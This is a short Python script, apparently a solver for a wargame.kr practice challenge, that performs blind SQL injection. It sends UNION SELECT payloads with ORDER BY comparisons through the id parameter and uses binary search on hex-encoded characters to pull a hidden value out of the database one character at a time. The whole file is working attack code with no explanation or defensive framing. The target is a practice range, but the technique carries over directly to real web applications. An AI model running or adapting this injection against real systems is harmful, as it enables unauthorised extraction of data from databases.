from requests import *
start=0
end=127
pivot=int((start+end)/2)
result=''
middle=''
for i in range(4):
    if start!=0 or end!=127:
        print('error')
        break
    for j in range(10):
        url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel%27 '
        middle=result
        middle+=str(hex(pivot)).replace('0x','%')
        payload=f'union select 1,2,3,%27{middle}%27,5 order by 4 asc %23'
        url+=payload
        print(url)
        response=get(url=url)
        print(start)
        print(pivot)
        print(end)
        if pivot==40 or pivot == 39:
            print('error2')
            break
        if start==pivot and start==end and pivot==end:
            start=0
            end=127
            pivot=int((start+end)/2)
            result=middle
            break
        if response.text.find('zairowkdlfhdkel') != -1:
            end=pivot
            pivot=int((start+end)/2)
        else:
            start=pivot+1
            pivot=int((start+end)/2)